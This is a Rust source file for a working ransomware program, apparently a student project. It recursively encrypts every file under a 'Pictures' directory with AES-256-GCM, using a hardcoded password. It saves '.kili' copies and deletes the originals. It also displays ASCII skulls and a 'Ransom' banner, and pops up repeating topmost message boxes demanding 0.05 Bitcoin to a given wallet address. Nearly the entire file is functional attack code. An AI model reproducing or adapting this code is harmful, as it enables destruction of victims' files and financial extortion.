use std::fs::File;
use std::{io, ptr};
use std::io::Write;
use std::path::Path;
use std::{fs, thread};

use aes_gcm::aead::{Aead, KeyInit};
use aes_gcm::{Aes256Gcm, Key, Nonce};
use colored::Colorize;
use hkdf::Hkdf;
use rand::{Rng, RngCore};
use sha2::{Digest, Sha256};
use std::process;
use std::time::Duration;
use winapi::um::winuser::{MessageBoxW, SetWindowPos, HWND_TOPMOST, IDCANCEL, IDOK, MB_ICONERROR, MB_OKCANCEL, SWP_NOSIZE, SWP_SHOWWINDOW};

extern crate winapi;

fn main() -> io::Result<()> {
    let directory_path = "../Pictures";

    thread::spawn(|| {
        show_skull();
    });

    if let Err(e) = list_files(directory_path) {
        eprintln!("Error while listing files: {}", e);
    }

    spawn_messageboxes(1);

    Ok(())
}

fn spawn_messageboxes(count: usize) {
    let mut handles = vec![];

    for _ in 0..count {
        let handle = thread::spawn(|| {
            show_messagebox();
        });
        handles.push(handle);
        thread::sleep(Duration::from_millis(500));
    }

    for handle in handles {
        let _ = handle.join();
    }
}
fn show_messagebox() {
    let l_msg: Vec<u16> = "Pay 0.050000 Bitcoin: 1Lbcfr7sAHTD9CgdQo3HTMTkV8LK4ZnX71\0"
        .encode_utf16()
        .collect();
    let l_title: Vec<u16> = "Your Pictures got encrypted\0".encode_utf16().collect();

    unsafe {
        loop {
            let hwnd = ptr::null_mut();

            let result = MessageBoxW(hwnd, l_msg.as_ptr(), l_title.as_ptr(), MB_OKCANCEL | MB_ICONERROR);

            let mut rng = rand::thread_rng();
            let x = rng.gen_range(100..800);
            let y = rng.gen_range(100..600);

            SetWindowPos(hwnd, HWND_TOPMOST, x, y, 0, 0, SWP_NOSIZE | SWP_SHOWWINDOW);

            if result == IDOK {
                process::exit(0);
            } else if result == IDCANCEL {
                spawn_messageboxes(2);
            }
        }
    }
}
fn show_skull() {
    let skull = r#"
                 uuuuuuu
             uu$$$$$$$$$$$uu
          uu$$$$$$$$$$$$$$$$$uu
         u$$$$$$$$$$$$$$$$$$$$$u
        u$$$$$$$$$$$$$$$$$$$$$$$u
       u$$$$$$$$$$$$$$$$$$$$$$$$$u
       u$$$$$$$$$$$$$$$$$$$$$$$$$u
       u$$$$$$"   "$$$"   "$$$$$$u
       "$$$$"      u$u       $$$$"
        $$$u       u$u       u$$$
        $$$u      u$$$u      u$$$
         "$$$$uu$$$   $$$uu$$$$"
          "$$$$$$$"   "$$$$$$$"
            u$$$$$$$u$$$$$$$u
             u$"$"$"$"$"$"$u
  uuu        $$u$ $ $ $ $u$$       uuu
 u$$$$        $$$$$u$u$u$$$       u$$$$
  $$$$$uu      "$$$$$$$$$"     uu$$$$$$
u$$$$$$$$$$$uu    """""    uuuu$$$$$$$$$$
$$$$"""$$$$$$$$$$uuu   uu$$$$$$$$$"""$$$"
 """      ""$$$$$$$$$$$uu ""$"""
           uuuu ""$$$$$$$$$$uuu
  u$$$uuu$$$$$$$$$uu ""$$$$$$$$$$$uuu$$$
  $$$$$$$$$$""""           ""$$$$$$$$$$$"
   "$$$$$"                      ""$$$$""
     $$$"                         $$$$"
      "#;

    let skulltwo = r#"
@@@@@                                        @@@@@
@@@@@@@                                      @@@@@@@
@@@@@@@           @@@@@@@@@@@@@@@            @@@@@@@
 @@@@@@@@       @@@@@@@@@@@@@@@@@@@        @@@@@@@@
     @@@@@     @@@@@@@@@@@@@@@@@@@@@     @@@@@
       @@@@@  @@@@@@@@@@@@@@@@@@@@@@@  @@@@@
         @@  @@@@@@@@@@@@@@@@@@@@@@@@@  @@
            @@@@@@@    @@@@@@    @@@@@@
            @@@@@@      @@@@      @@@@@
            @@@@@@      @@@@      @@@@@
             @@@@@@    @@@@@@    @@@@@
              @@@@@@@@@@@  @@@@@@@@@@
               @@@@@@@@@@  @@@@@@@@@
           @@   @@@@@@@@@@@@@@@@@   @@
           @@@@  @@@@ @ @ @ @ @@@@  @@@@
          @@@@@   @@@ @ @ @ @ @@@   @@@@@
        @@@@@      @@@@@@@@@@@@@      @@@@@
      @@@@          @@@@@@@@@@@          @@@@
   @@@@@              @@@@@@@              @@@@@
  @@@@@@@                                 @@@@@@@
   @@@@@                                   @@@@@
    "#;

    let text = r#"
     _____
    |  __ \
    | |__) |__ _ _ __  ___  ___  _ __ ___
    |  _  // _` | '_ \/ __|/ _ \| '_ ` _ \
    | | \ \ (_| | | | \__ \ (_) | | | | | |
    |_|  \_\__,_|_| |_|___/\___/|_| |_| |_|
    "#;

    for _ in 0..3 {
        println!("{}", skull.bright_green());
        thread::sleep(Duration::from_millis(2000));
        clearscreen::clear().unwrap();
        print!("{}", text.bright_green().bold());
        thread::sleep(Duration::from_millis(2000));
        clearscreen::clear().unwrap();
        print!("{}", skulltwo.bright_green());
        thread::sleep(Duration::from_millis(2000));
        clearscreen::clear().unwrap();
        print!("{}", text.bright_green().bold());
        thread::sleep(Duration::from_millis(2000));
        clearscreen::clear().unwrap();
    }
    println!("{}", skull.bright_green());
    print!("{}", text.bright_green().bold());
}

fn list_files<P: AsRef<Path>>(path: P) -> io::Result<()> {
    let entries = fs::read_dir(path)?;

    for entry in entries {
        let entry = entry?;
        let path = entry.path();

        // println!("{}", entry.path().to_str().unwrap());

        if (path.is_dir()) {
            list_files(&path)?;
        }

        if let Err(e) = encrypt_image(entry.path().to_str().unwrap(), "htlleonding") {
            eprintln!("Error encrypting image: {}", e);
        }
    }

    Ok(())
}

fn encrypt_image(file_path: &str, password: &str) -> std::io::Result<()> {
    let image_data = fs::read(file_path.to_string())?;

    let salt = rand::random::<[u8; 16]>();
    let hk = Hkdf::<Sha256>::new(Some(&salt), password.as_bytes());
    let mut key_bytes = [0u8; 32];
    hk.expand(b"aes-encryption", &mut key_bytes)
        .expect("HKDF key expansion failed");
    let key = Key::<Aes256Gcm>::from_slice(&key_bytes);

    let mut iv = [0u8; 12];
    rand::thread_rng().fill_bytes(&mut iv);
    let nonce = Nonce::from_slice(&iv);

    let cipher = Aes256Gcm::new(key);
    let encrypted_data = cipher
        .encrypt(nonce, image_data.as_ref())
        .expect("encryption failed");

    let mut encrypted_file = File::create(format!("{}.kili", file_path))?;
    encrypted_file.write_all(&salt)?;
    encrypted_file.write_all(&iv)?;
    encrypted_file.write_all(&encrypted_data)?;

    fs::remove_file(file_path)?;
    Ok(())
}
